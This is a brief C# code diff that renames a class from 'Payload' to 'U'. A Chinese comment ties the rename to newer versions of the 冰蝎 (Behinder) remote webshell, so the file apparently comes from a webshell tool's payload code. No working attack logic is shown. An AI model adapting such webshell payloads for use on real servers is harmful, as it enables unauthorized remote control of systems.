@@ -11,7 +11,7 @@ using System.Runtime.Serialization.Json;
 using System.Reflection;
 using System.Collections.Generic;
 
-public class Payload // 当远程冰蝎shell为新的时改名为U
+public class U // 当远程冰蝎shell为新的时改名为U
 {
     [KnownType(typeof(ArrayList))]
     [DataContract]
